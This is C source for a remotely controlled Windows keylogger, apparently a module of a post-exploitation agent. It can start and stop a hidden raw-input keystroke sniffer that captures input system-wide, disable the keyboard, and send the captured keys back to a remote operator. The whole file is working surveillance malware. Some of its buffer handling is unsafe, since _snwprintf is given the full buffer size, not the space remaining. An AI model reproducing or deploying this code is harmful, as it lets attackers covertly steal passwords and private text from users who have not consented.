#include "precomp.h"
#include "raw.h"
#include <tchar.h>

extern HMODULE hookLibrary;
extern HINSTANCE hAppInstance;

LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
int ui_log_key(UINT vKey);
int ui_resolve_raw_api();

const char *c0_ascii[] = {
	"^@", "^A", "^B", "^C", "^D", "^E", "^F", "^G", "^H", "^I",
	"^J", "^K", "^L", "^M", "^N", "^O", "^P", "^Q", "^R", "^S",
	"^T", "^U", "^V", "^W", "^X", "^Y", "^Z", "^[", "^\\", "^]",
	"^^", "^-"
};

/*
 * Enables or disables keyboard input
 */
DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	BOOLEAN enable = FALSE;
	DWORD result = ERROR_SUCCESS;

	enable = packet_get_tlv_value_bool(request, TLV_TYPE_BOOL);

	// If there's no hook library loaded yet
	if (!hookLibrary)
		extract_hook_library();

	// If the hook library is loaded successfully...
	if (hookLibrary)
	{
		DWORD (*enableKeyboardInput)(BOOL enable) = (DWORD (*)(BOOL))GetProcAddress(
				hookLibrary, "enable_keyboard_input");

		if (enableKeyboardInput)
			result = enableKeyboardInput(enable);
	}
	else
		result = GetLastError();

	// Transmit the response
	packet_transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

typedef enum { false=0, true=1 } bool;


/*
 * function pointers for the raw input api
 */

f_GetRawInputData fnGetRawInputData;
f_RegisterRawInputDevices fnRegisterRawInputDevices;

bool boom[1024];
const char g_szClassName[] = "klwClass";
HANDLE tKeyScan = NULL;
const unsigned int KEYBUFSIZE = 1024 * 1024;
WCHAR *keyscan_buf = NULL;
unsigned int idx = 0;

/*
 *  key logger updates begin here
 */

int WINAPI ui_keyscan_proc()
{
WNDCLASSEX klwc;
    HWND hwnd;
    MSG msg;
    int ret = 0;

    if (fnGetRawInputData == NULL || fnRegisterRawInputDevices == NULL)
    {
      ret = ui_resolve_raw_api();
      if (ret != 1)		 // resolving functions failed
      {
        return 0;
      }
    }

    // register window class
    ZeroMemory(&klwc, sizeof(WNDCLASSEX));
    klwc.cbSize        = sizeof(WNDCLASSEX);
    klwc.lpfnWndProc   = ui_keyscan_wndproc;
    klwc.hInstance     = hAppInstance;
    klwc.lpszClassName = g_szClassName;
    
    if(!RegisterClassEx(&klwc))
    {
        return 0;
    }

    // initialize keyscan_buf
    if(keyscan_buf) {
        free(keyscan_buf);
        keyscan_buf = NULL;
    }

    keyscan_buf = calloc(KEYBUFSIZE, sizeof(WCHAR));

    // create message-only window
    hwnd = CreateWindowEx(
        0,
        g_szClassName,
        NULL,
        0,
        0, 0, 0, 0,
        HWND_MESSAGE, NULL, hAppInstance, NULL
    );

    if(!hwnd)
    {
        return 0;
    }
    
    // message loop
    while(GetMessage(&msg, NULL, 0, 0) > 0)
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    return msg.wParam;
}

LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
    UINT dwSize;
    RAWINPUTDEVICE rid;
    RAWINPUT *buffer;
    
    switch(msg)
    {
        // register raw input device
        case WM_CREATE:
            rid.usUsagePage = 0x01;
            rid.usUsage = 0x06;
            rid.dwFlags = RIDEV_INPUTSINK;
            rid.hwndTarget = hwnd;
            
            if(!fnRegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
            {
                return -1;
            }
            
        case WM_INPUT:
            // request size of the raw input buffer to dwSize
            fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
                sizeof(RAWINPUTHEADER));
        
            // allocate buffer for input data
            buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);
        
            if(fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
                sizeof(RAWINPUTHEADER)))
            {
                // if this is keyboard message and WM_KEYDOWN, log the key
                if(buffer->header.dwType == RIM_TYPEKEYBOARD
                    && buffer->data.keyboard.Message == WM_KEYDOWN)
                {
                    if(ui_log_key(buffer->data.keyboard.VKey) == -1)
                        DestroyWindow(hwnd);
                }
            }
        
            // free the buffer
            HeapFree(GetProcessHeap(), 0, buffer);
            break;
            
        case WM_DESTROY:
            PostQuitMessage(0);
            break;
            
        default:
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

/*
 * Starts the keyboard sniffer
 */
DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;

	if(tKeyScan) {
		result = 1;
	} else {
		// Make sure we have access to the input desktop
		if(GetAsyncKeyState(0x0a) == 0) {
			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ui_keyscan_proc, NULL, 0, NULL);
		} else {
			// No permission to read key state from active desktop
			result = 5;
		}
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Stops they keyboard sniffer
 */
DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	idx = 0;

	if(tKeyScan) {
		TerminateThread(tKeyScan, 0);
		tKeyScan = NULL;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Returns the sniffed keystrokes
 */
DWORD request_ui_get_keys(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	
	if(tKeyScan) {
		// This works because NULL defines the end of data (or if its wrapped, the whole buffer)
		packet_add_tlv_string(response, TLV_TYPE_KEYS_DUMP, (LPCSTR)keyscan_buf);
		memset(keyscan_buf, 0, KEYBUFSIZE);
		idx = 0;
	} else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
* Returns the sniffed keystrokes (UTF8)
*/

DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
{
	Packet *response = packet_create_response(request);
	DWORD result = ERROR_SUCCESS;
	char *utf8_keyscan_buf = NULL;

	if (tKeyScan) {
		utf8_keyscan_buf = wchar_to_utf8(keyscan_buf);
		packet_add_tlv_raw(response, TLV_TYPE_KEYS_DUMP, (LPVOID)utf8_keyscan_buf, strlen(utf8_keyscan_buf)+1);
		memset(keyscan_buf, 0, KEYBUFSIZE);
		idx = 0;
	}
	else {
		result = 1;
	}

	// Transmit the response
	packet_transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * log keystrokes
 */

int ui_log_key(UINT vKey)
{
    BYTE lpKeyboard[256];
	WCHAR kb[16] = { 0 };

	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
	GetKeyboardState(lpKeyboard);

	// treat keyscan_buf as a circular array
	// boundary could be adjusted
	if ((idx + 16) >= KEYBUFSIZE)
	{
		idx = 0;
	}

	switch (vKey)
	{
	case VK_BACK:
		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<^H>");
		break;
	case VK_RETURN:
		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<CR>\r\n");
		break;
	case VK_SHIFT:
		break;
	case VK_LCONTROL:
		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<Ctrl>");
		break;
	case VK_MENU:
		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<Alt>");
		break;
	case VK_TAB:
		idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"<Tab>");
		break;
	default:
		if (ToUnicodeEx(vKey, MapVirtualKey(vKey, 0), lpKeyboard, kb, 16, 0, NULL) == 1)
		{
			if ((UINT)vKey <= 0x1f)
			{
				idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"%ls", c0_ascii[vKey]);
				return 0;
			}
			else
			{
				idx += _snwprintf(keyscan_buf + idx, KEYBUFSIZE, L"%ls", kb);
			}
		}
	}
	return 0;
}

/*
 * resolve the required functions from the raw input api 
 */

int ui_resolve_raw_api()
{
  HINSTANCE hu32 = LoadLibrary("user32.dll");

  if (hu32 == NULL)
  {
    return 0;
  }

  fnGetRawInputData = (f_GetRawInputData)GetProcAddress(hu32, "GetRawInputData");
  if (fnGetRawInputData == NULL)
  {
    FreeLibrary(hu32);
    return 0;
  }

  fnRegisterRawInputDevices = (f_RegisterRawInputDevices)GetProcAddress(hu32, "RegisterRawInputDevices");
  if (fnRegisterRawInputDevices == NULL)
  {
    FreeLibrary(hu32);
    return 0;
  }
  
  return 1;
}